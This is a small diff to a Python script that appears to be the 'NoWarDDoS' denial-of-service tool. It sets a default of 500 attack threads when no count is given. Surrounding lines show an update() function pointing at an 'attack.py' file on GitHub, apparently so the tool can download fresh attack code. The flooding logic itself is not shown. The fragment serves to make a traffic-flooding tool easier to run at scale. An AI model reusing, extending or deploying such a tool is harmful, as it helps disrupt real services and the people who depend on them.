@@ -3,7 +3,10 @@ import sys
 import os
 import requests
 
-threads = int(sys.argv[1])
+if len(sys.argv) > 1:
+    threads = int(sys.argv[1])
+else:
+    threads = 500
 
 def update():
     url = "https://raw.githubusercontent.com/AlexTrushkovsky/NoWarDDoS/main/attack.py"
